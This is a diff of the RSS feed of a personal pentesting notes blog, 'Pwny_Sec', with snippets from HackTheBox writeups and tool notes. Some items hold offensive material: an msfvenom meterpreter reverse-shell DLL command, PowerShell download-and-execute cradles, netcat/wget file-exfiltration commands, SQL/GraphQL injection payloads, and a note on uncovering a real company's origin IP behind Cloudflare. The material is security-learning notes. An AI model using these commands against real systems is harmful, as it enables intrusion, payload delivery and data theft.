@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Pwny_Sec</title>
@@ -21,6 +21,16 @@
     
     <item>
       <title></title>
+      <link>/webapp/earnest-orign/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/earnest-orign/</guid>
+      <description>Well, I have spent three days trying to exploit the site. There isn&amp;rsquo;t much to report there are some cors misconfigurations and the authorization header. If you would be interested in those finding let me know. Let us get to the issue that brings me here, a misconfiguration in Cloudflare.
+The Front-end resolves to www.earnest.com.cdn.cloudflare.net at 104.18.2.230 owned by CloudFlare, these are your reverse proxy and WAF domain and IP. I tried to get the Origin IP using https://censys.</description>
+    </item>
+    
+    <item>
+      <title></title>
       <link>/webapp/exploiting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
@@ -28,6 +38,20 @@
       <description>So I&amp;rsquo;m going to try and do a better job here than the first one. Here we will cover attacking the different web applications. First will explore bypassing user authenication by the front end. the back end will assume all request are valid. this is fix in version two of HTTP.
 by submitting this request twice. were able to get
 POST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/webapp/ssrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/ssrf/</guid>
+      <description>When a server makes a request to another part of the website you can.
+Finding the vulnerability use google search for jira europa and the name of the website.
+Tips &amp;amp; Tricks
+@thedawgyg
+When testing for SSRF, change the HTTP version from 1.1 to HTTP/0.9 and remove the host header completely. This has worked to bypass several SSRF fixes in the past.
+On HTTP/0.9 you dont need a host header at all.</description>
     </item>
     
     <item>
@@ -47,7 +71,7 @@ POST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net 
       <guid>/windows/bloodhound/</guid>
       <description>TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.
 I would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.
-##### echo &amp;quot;deb http://httpredir.</description>
+#####echo &amp;quot;deb http://httpredir.</description>
     </item>
     
     <item>
@@ -57,9 +81,26 @@ I would highly recommend installing Neo4j using the repository. Neo4j is a datab
       
       <guid>/webapp/burp/burp/</guid>
       <description>DA BASICS
-&amp;lt;-
 Burp Suit is a graphical tool for web app security. It can do a host of things but in the free version its limited. In hack the box you will mostly use it to proxy web request and edit them before you send it off to the server. theres repeater which is basically like saving the web request allows you to repeat the web request.
 PROXY : Will set the ip address and port which burp will intercept the traffic.</description>
+    </item>
+    
+    <item>
+      <title>Burp Collaborator/Extensions</title>
+      <link>/webapp/burp/collab-exten/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/burp/collab-exten/</guid>
+      <description>Memory
+Burps default memory allocation is 2gb but you will most likely need more than that.
+java -jar -Xmx6g /opt/BurpSuitePro/burpsuite_pro.jar BurpSuitePro/burpsuite_pro.jar Collaborator
+cd /opt/BurpSuitePro sudo java -jar /opt/BurpSuitePro/burpsuite_pro.jar --collaborator-server References
+https://portswigger.net/burp/documentation/collaborator https://portswigger.net/blog/introducing-burp-collaborator https://portswigger.net/burp/documentation/collaborator/deploying
+Extension List
+This is a list of extensions created by https://twitter.com/UK_Daniel_Card?s=20
+List
+Reference
+https://github.com/Xservus/PenTestTools/blob/master/PenTestTools.xlsx</description>
     </item>
     
     <item>
@@ -69,30 +110,16 @@ PROXY : Will set the ip address and port which burp will intercept the traffic.<
       
       <guid>/webapp/burp/burp-ca/</guid>
       <description>So, Recently had to reinstall kali. I had to setup burp again to work with TLS certs. To properly intercept https traffic.
-Well, just go to  http:/burp:port, click on  CA Certificate download the cert. Now, in firefox click on options click on preferences. Go to  Privacy &amp;amp; Security  take the scroll bar go all the way to the bottom and go to  View Certificares Under Certificates header.</description>
+Well, just go to http:/burp:port, click on CA Certificatedownload the cert. Now, in firefox click on options click on preferences. Go to Privacy &amp;amp; Security take the scroll bar go all the way to the bottom and go to View Certificares Under Certificates header. Under the Authorities tab click on import then import the Cert we got from burp, most likely inside Downloads.</description>
     </item>
     
     <item>
-      <title>CHAOS</title>
-      <link>/hackthebox/boxes/chaos-og/</link>
+      <title>Bypassing WAF</title>
+      <link>/webapp/bypasswaf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/hackthebox/boxes/chaos-og/</guid>
-      <description>chaos web server is hosting quite a few webpages. 10.10.10.120/wp/wordpress, chaos.htb, webmail.chaos.htb, chaos.htb:10000. Using wfuzz we find the subdomain. THERE IS A WAF INPLACE BLOCK ACCESSIVE LOGIN ETC
-NMAP
-not sure what 10000 really is most likely related
-nmap -sC -sV -oA nmap/initial chaos.htb -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:30 EST Nmap scan report for chaos.htb (10.10.10.120) Host is up (0.046s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.</description>
-    </item>
-    
-    <item>
-      <title>CTF</title>
-      <link>/hackthebox/boxes/inusectf/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/hackthebox/boxes/inusectf/</guid>
-      <description>The biggest take away would be
-I recently participated in a ctf, it was different than htb. more about finding a bunch of hidden flags all over the file system. in various places. There were 9 host and over 25 flags. This was a fun new kind of a ctf. =].DONT OVERESTIMATE THE CTF.
-WebServer: It had a lot of ports open an I was quick to rush in and wasted a bit of time that couldn&amp;rsquo;t have been prevented.</description>
+      <guid>/webapp/bypasswaf/</guid>
+      <description>https://blog.christophetd.fr/bypassing-cloudflare-using-internet-wide-scan-data/ https://medium.com/bugbountywriteup/bypass-cloudflare-waf-to-pwned-application-2c9e4f862319</description>
     </item>
     
     <item>
@@ -101,7 +128,7 @@ WebServer: It had a lot of ports open an I was quick to rush in and wasted a bit
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/hackthebox/boxes/carrier/</guid>
-      <description>TCP Nmap 7.70 scan initiated Sat Dec 22 18:11:46 2018 as: nmap -sC -sV -oA carrier-total -T5 -p- 10.10.10.105 Nmap scan report for carrier.htb (10.10.10.105) Host is up (0.14s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA) | 256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA) |_ 256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519) 80/tcp open http Apache httpd 2.</description>
+      <description>TCP Nmap 7.70 scan initiated Sat Dec 22 18:11:46 2018 as: nmap -sC -sV -oA carrier-total -T5 -p- 10.10.10.105Nmap scan report for carrier.htb (10.10.10.105) Host is up (0.14s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION21/tcp filtered ftp 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)| 256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA) |_ 256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)80/tcp open http Apache httpd 2.</description>
     </item>
     
     <item>
@@ -117,6 +144,18 @@ There&amp;rsquo;s a script running in the background that will reset all the cha
     </item>
     
     <item>
+      <title>CHAOS</title>
+      <link>/hackthebox/boxes/chaos-og/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/chaos-og/</guid>
+      <description>chaos web server is hosting quite a few webpages. 10.10.10.120/wp/wordpress, chaos.htb, webmail.chaos.htb, chaos.htb:10000. Using wfuzz we find the subdomain. THERE IS A WAF INPLACE BLOCK ACCESSIVE LOGIN ETC
+NMAP
+not sure what 10000 really is most likely related
+nmap -sC -sV -oA nmap/initial chaos.htb -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:30 EST Nmap scan report for chaos.htb (10.10.10.120) Host is up (0.046s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.</description>
+    </item>
+    
+    <item>
       <title>ChiselTunnel</title>
       <link>/windows/chisel/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -124,20 +163,29 @@ There&amp;rsquo;s a script running in the background that will reset all the cha
       <guid>/windows/chisel/</guid>
       <description>MY FAVORITE SOCKS PROXY TOOL.
 Chisel SERVER
-./Chisel server -p 8000 -reverse -v -reverse the connection this is important -v verbose -p port  Chisel.exe CLIENT
-c.exe client 10.10.15.254:8000 R:8081:127.0.0.1:8081	 </description>
+./Chisel server -p 8000 -reverse -v -reverse the connection this is important -v verbose -p port Chisel.exe CLIENT
+c.exe client 10.10.15.254:8000 R:8081:127.0.0.1:8081	</description>
     </item>
     
     <item>
-      <title>DLL_CraFt&amp;BreW</title>
-      <link>/concepts/dll/</link>
+      <title>corrupted zip file</title>
+      <link>/trouble_solutions/corrupted-zip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/concepts/dll/</guid>
-      <description>So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom &amp;amp; dll&amp;rsquo;s crafted with visual studio&amp;rsquo;s. cheers to IppSec and 0xdf
-MSFVENOM remember you don&amp;rsquo;t always need x64
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll  Beryllium https://github.com/attl4s/pruebas
-a dll that contains meterpreter shell that takes env var as variables</description>
+      <guid>/trouble_solutions/corrupted-zip/</guid>
+      <description>I recently backed up a bunch of important files, but the zip file was corrupted. It would return a null error when trying to open the zip file. This was due to the fact one of the files in the zip file was corrupted. So i would like to take the time to record ways to get around this and fix the zip file.
+There are two ways i fixed this issue, one was repairing the zip file.</description>
+    </item>
+    
+    <item>
+      <title>CTF</title>
+      <link>/hackthebox/boxes/inusectf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/inusectf/</guid>
+      <description>The biggest take away would be
+I recently participated in a ctf, it was different than htb. more about finding a bunch of hidden flags all over the file system. in various places. There were 9 host and over 25 flags. This was a fun new kind of a ctf. =].DONT OVERESTIMATE THE CTF.
+WebServer: It had a lot of ports open an I was quick to rush in and wasted a bit of time that couldn&amp;rsquo;t have been prevented.</description>
     </item>
     
     <item>
@@ -155,7 +203,19 @@ a dll that contains meterpreter shell that takes env var as variables</descripti
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/hackthebox/boxes/devel/</guid>
-      <description>nmap -sT -p- -Pn -T5 nmap/initial 10.10.10.5 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 14:57 EST Unable to split netmask from target expression: &amp;quot;nmap/initial&amp;quot; Nmap scan report for 10.10.10.5 Host is up (0.044s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 75.84 seconds  nmap -sV -sC -p21,80 nmap/http-ftp 10.10.10.5 Starting Nmap 7.</description>
+      <description>nmap -sT -p- -Pn -T5 nmap/initial 10.10.10.5 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 14:57 EST Unable to split netmask from target expression: &amp;quot;nmap/initial&amp;quot; Nmap scan report for 10.10.10.5 Host is up (0.044s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 75.84 seconds nmap -sV -sC -p21,80 nmap/http-ftp 10.10.10.5 Starting Nmap 7.70 ( https://nmap.</description>
+    </item>
+    
+    <item>
+      <title>DLL_CraFt&amp;BreW</title>
+      <link>/concepts/dll/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/concepts/dll/</guid>
+      <description>So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom &amp;amp; dll&amp;rsquo;s crafted with visual studio&amp;rsquo;s. cheers to IppSec and 0xdf
+MSFVENOM	remember you don&amp;rsquo;t always need x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll Beryllium	https://github.com/attl4s/pruebas
+a dll that contains meterpreter shell that takes env var as variables</description>
     </item>
     
     <item>
@@ -168,17 +228,6 @@ a dll that contains meterpreter shell that takes env var as variables</descripti
     </item>
     
     <item>
-      <title>FTP</title>
-      <link>/linux/ftp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux/ftp/</guid>
-      <description>File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I&amp;rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.
-https://slacksite.com/other/ftp.html
-mget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS &amp;amp; SFTP</description>
-    </item>
-    
-    <item>
       <title>File Transfer</title>
       <link>/concepts/file-transfer/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -186,9 +235,9 @@ mget * download everything in the directory get download file / documents put up
       <guid>/concepts/file-transfer/</guid>
       <description>######## LI/NUX #########
 Python http server
-python3 -m http.server 9090 python -m simpleHTTPServer 9090  Curl
-upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file  wget
-upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename  NetCat File Transfer
+python3 -m http.server 9090 python -m simpleHTTPServer 9090 Curl
+upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file wget
+upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename NetCat File Transfer
 Netcat notice with this method , sender &amp;lt;, reciever &amp;gt;. -w wait, -l listener -p port
 upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt; file.</description>
     </item>
@@ -218,7 +267,7 @@ NOTICE : KEY WHEN IT SAYS DOWNLOAD USER PYTHON HTTP SERVER, WHEN IT SAY UPLOAD U
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows/filetransfer/</guid>
-      <description>UNDERDEVELOPMENT GONNA GO DO SOME CTF LOL  #####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString(&#39;http://IP_ADDRESS/file-needed&#39;) Invoke-Web-Request = powershell IWR &amp;quot;http://10.10.14.49/nc.exe&amp;quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not &#39; #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine impacket-smbserver share `pwd` | ` not &#39; #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.</description>
+      <description>UNDERDEVELOPMENT GONNA GO DO SOME CTF LOL #####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString(&#39;http://IP_ADDRESS/file-needed&#39;) Invoke-Web-Request = powershell IWR &amp;quot;http://10.10.14.49/nc.exe&amp;quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not &#39; #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine impacket-smbserver share `pwd` | ` not &#39; #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.</description>
     </item>
     
     <item>
@@ -239,6 +288,18 @@ Changeing /etc/hosts didn&amp;rsquo;t notice any change then i went to 0xdf note
       
       <guid>/hackthebox/boxes/friendzone/</guid>
       <description>Not shown: 993 closed ports [326/1271] PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.</description>
+    </item>
+    
+    <item>
+      <title>FTP</title>
+      <link>/linux/ftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux/ftp/</guid>
+      <description>File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I&amp;rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.
+https://slacksite.com/other/ftp.html
+mget * download everything in the directoryget download file / documentsput upload file / documentsnmap (maybe even in intereactive mode)SSHFS &amp;amp; SFTP
+SSHFS is built on SFTP.</description>
     </item>
     
     <item>
@@ -274,6 +335,19 @@ Nmap
     </item>
     
     <item>
+      <title>Graphql</title>
+      <link>/webapp/graphql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/graphql/</guid>
+      <description>GRaphQL injection
+EndPoints:
+/graphql/ /graphql/console/ /graphql.php /graphiql/ /graphiql.php Injection:
+OR SLEEP(20) union (sleep(10)) and &#39;1=1 &#39;;SELECT 1;SELECT pg_sleep\(30\);-- &#39; union select current_user(),database(),3 and &#39;1=1 (id:\&#39;\&#39;) to get the __schema
+{&amp;quot;query&amp;quot;:&amp;quot;query listPromotionalCartItems {\n __schema{\n types{\n name \n} \n} \n} \n&amp;quot;,&amp;quot;variables&amp;quot;:{}} {&amp;quot;query&amp;quot;:&amp;quot;query {\n __schema{\n types{\n name \n} \n} \n} \n&amp;quot;,&amp;quot;variables&amp;quot;:{}} { &amp;quot;query&amp;quot;: &amp;quot;{ __type(name: \&amp;quot;User\&amp;quot;) { name fields { name } } }&amp;quot;,&amp;quot;variables&amp;quot;:{}} </description>
+    </item>
+    
+    <item>
       <title>HTTP SMUGGLING</title>
       <link>/webapp/http-smuggling/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -291,7 +365,7 @@ Some server support transfer-encoding headers which, breaks up request. There ar
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/trouble_solutions/github/hugopowershell/</guid>
-      <description>POWERSHELL Overview, how to install Hugo and how to set up the web pages using GitHub as repository in a WINDOWS environment. Since most of the commands have a Linux counterpart you could follow.
+      <description>role=&amp;quot;alert&amp;quot;&amp;gt;POWERSHELLOverview, how to install Hugo and how to set up the web pages using GitHub as repository in a WINDOWS environment. Since most of the commands have a Linux counterpart you could follow.
 First off id like to say I wish there was a way to do this with less command line. I initially tried setting it up on GITLAB but I just couldn&amp;rsquo;t find the material I need to do within windows.</description>
     </item>
     
@@ -302,7 +376,7 @@ First off id like to say I wish there was a way to do this with less command lin
       
       <guid>/webapp/hydra/</guid>
       <description>Hydra is a WebApp Brutefocer. suupply it with the required information and it will enumrate logins based on customer login word list of you could use rock you.
-Hydra v8.8 &amp;copy; 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
  Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PO RT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -I ignore an existing restore file (don&#39;t wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type &amp;quot;-x -h&amp;quot; to get help -y disable use of symbols in bruteforce, see above -e nsr try &amp;quot;n&amp;quot; null password, &amp;quot;s&amp;quot; login as pass and/or &amp;quot;r&amp;quot; reversed login -u loop around users, not passwords (effective!</description>
     </item>
     
@@ -326,8 +400,8 @@ Linux version 3.</description>
       
       <guid>/linux/linux/</guid>
       <description>Permisions ~~~~
-​ Chown change owner, the below example will change all the files in the directory to owner Pwny_sec and tot he group root.
-chown -R Pwny_sec:root * -R recurssive  ​ Chmod change modification, this can be used to change how a file is treated can you read or write or execute the file plus suid how the file inherits it&amp;rsquo;s permissions. like from the user who created it suid.</description>
+​	Chown change owner, the below example will change all the files in the directory to owner Pwny_sec and tot he group root.
+chown -R Pwny_sec:root * -R recurssive ​	Chmod change modification, this can be used to change how a file is treated can you read or write or execute the file plus suid how the file inherits it&amp;rsquo;s permissions. like from the user who created it suid.</description>
     </item>
     
     <item>
@@ -338,7 +412,7 @@ chown -R Pwny_sec:root * -R recurssive  ​ Chmod change modification, this can 
       <guid>/hackthebox/boxes/help/</guid>
       <description>The weirdest glitch bug I&amp;rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.
 I&amp;rsquo;m not sure if completely removing the network manager is required but i purged it out.
- sudo apt-get purge network-manager  To gain internet access reset the dhclient on the network interface, your network card maybe not be named eth0.</description>
+ sudo apt-get purge network-manager To gain internet access reset the dhclient on the network interface, your network card maybe not be named eth0.</description>
     </item>
     
     <item>
@@ -349,7 +423,7 @@ I&amp;rsquo;m not sure if completely removing the network manager is required bu
       <guid>/trouble_solutions/network-manager-down/</guid>
       <description>The weirdest glitch bug I&amp;rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.
 I&amp;rsquo;m not sure if completely removing the network manager is required but i purged it out.
- sudo apt-get purge network-manager  To gain internet access even though the network manager is down and isn&amp;rsquo;t connected.</description>
+ sudo apt-get purge network-manager To gain internet access even though the network manager is down and isn&amp;rsquo;t connected.</description>
     </item>
     
     <item>
@@ -377,37 +451,7 @@ nmap -sV -sC 10.10.10.8 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/_header/</guid>
-      <description> Pwny_Sec </description>
-    </item>
-    
-    <item>
-      <title>SMB</title>
-      <link>/windows/linux-smb-enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows/linux-smb-enum/</guid>
-      <description>Mounting smb shares linux
-You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
-sudo apt install cifs-utils -y sudo apt install nfs-common  Error Message
-bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program.  Example
-mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share  +++
-SMBCLIENT
-Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
-    </item>
-    
-    <item>
-      <title>SMB-KALI</title>
-      <link>/windows/smb/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows/smb/</guid>
-      <description>Mounting smb shares linux
-You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
-sudo apt install cifs-utils -y sudo apt install nfs-common  Error Message
-bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program.  Example
-mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share  +++
-SMBCLIENT
-Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
+      <description>Pwny_Sec </description>
     </item>
     
     <item>
@@ -436,7 +480,37 @@ Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLV
       
       <guid>/hackthebox/boxes/gold-sizzle/</guid>
       <description>Nmap
-80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn&#39;t have a title (text/html).  445/tcp open microsoft-ds?  5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2019-06-03T11:45:21 |_Not valid after: 2020-06-02T11:45:21 |_ssl-date: 2019-06-03T15:07:26+00:00; -6m04s from scanner time.</description>
+80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn&#39;t have a title (text/html). 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2019-06-03T11:45:21 |_Not valid after: 2020-06-02T11:45:21 |_ssl-date: 2019-06-03T15:07:26+00:00; -6m04s from scanner time.</description>
+    </item>
+    
+    <item>
+      <title>SMB</title>
+      <link>/windows/linux-smb-enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/linux-smb-enum/</guid>
+      <description>Mounting smb shares linux
+You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
+sudo apt install cifs-utils -y sudo apt install nfs-common Error Message
+bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program. Example
+mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share +++
+SMBCLIENT
